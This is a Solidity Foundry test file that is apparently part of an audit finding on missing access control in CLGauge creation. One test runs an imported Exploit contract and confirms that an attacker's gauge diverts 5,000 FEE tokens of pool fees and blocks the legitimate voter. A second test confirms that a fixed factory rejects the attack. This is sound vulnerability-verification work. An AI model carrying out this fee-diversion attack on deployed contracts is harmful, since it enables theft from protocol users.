// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    CLGauge,
    CLGaugeFactoryFixed,
    CLPool,
    Exploit,
    FeeToken,
    Voter
} from "./58017-h-06-lack-of-access-control-in-clgauge-creation-allows-unaut.sol";

contract Finding58017Test is Test {
    function test_exploit_attacker_gauge_receives_fees() public {
        Exploit e = new Exploit();
        uint256 emissions = e.EMISSIONS();
        assertEq(e.fee().balanceOf(address(e.pool())), emissions, "fees accrued on pool");

        e.run();

        assertEq(e.fee().balanceOf(address(this)), emissions, "attacker received 5000 FEE");
        assertEq(e.feesForwarded(), emissions, "gauge forwarded 5000");
        assertTrue(e.legitBlocked(), "legitimate voter create reverted");
        assertEq(e.pool().gauge(), e.attackerGauge(), "pool treats attacker gauge as real");
        assertEq(e.factory().isGauge(e.attackerGauge()), true, "factory lists the gauge");
        assertEq(emissions, 5_000 ether, "harm magnitude");
    }

    function test_control_only_voter_can_pin_gauge() public {
        FeeToken fee = new FeeToken();
        Voter voter = new Voter(address(0xB0B));
        CLGaugeFactoryFixed factory = new CLGaugeFactoryFixed(address(voter), address(0xCAFE));
        CLPool pool = new CLPool(fee, address(factory));
        voter.setFactory(address(factory));
        fee.mint(address(pool), 5_000 ether);

        vm.expectRevert(bytes("Only voter can create gauge"));
        factory.createGauge(address(pool), address(this), address(0xCAFE), true);

        assertEq(pool.gauge(), address(0), "attacker did not pin a gauge");
        assertEq(fee.balanceOf(address(pool)), 5_000 ether, "fees stayed on the pool");
        assertEq(fee.balanceOf(address(this)), 0, "attacker received nothing");

        address g = voter.createCLGauge(address(pool));
        assertEq(pool.gauge(), g, "voter gauge is the real one");
        uint256 paid = CLGauge(g).claimFees();
        assertEq(paid, 5_000 ether, "protocol bribe receives the 5000");
        assertEq(fee.balanceOf(voter.protocolBribe()), 5_000 ether, "fees paid to protocol bribe");
        assertEq(fee.balanceOf(address(this)), 0, "attacker still empty");
    }
}

